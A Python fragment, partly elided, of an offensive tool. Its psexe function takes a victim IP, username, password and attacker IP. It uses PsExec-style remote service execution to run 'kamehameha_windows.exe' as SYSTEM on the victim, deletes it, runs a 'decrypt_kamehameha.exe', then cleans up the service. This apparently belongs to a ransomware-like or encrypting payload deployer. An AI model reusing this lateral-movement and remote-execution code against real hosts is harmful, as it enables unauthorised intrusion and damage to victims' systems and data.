...
def psexe(victim_ip,username,password,attacker_ip):
    ...
    try:
        ...
        stdout, stderr, rc = c.run_executable("C:\\Users\\"+username+"\\kamehameha_windows.exe", use_system_account=True)
        stdout, stderr, rc = c.run_executable("del C:\\Users\\"+username+"\\kamehameha_windows.exe", use_system_account=True)
        stdout, stderr, rc = c.run_executable("C:\\Users\\"+username+"\\decrypt_kamehameha.exe", use_system_account=True)
    finally:
        c.remove_service()
        c.disconnect()
        return status 
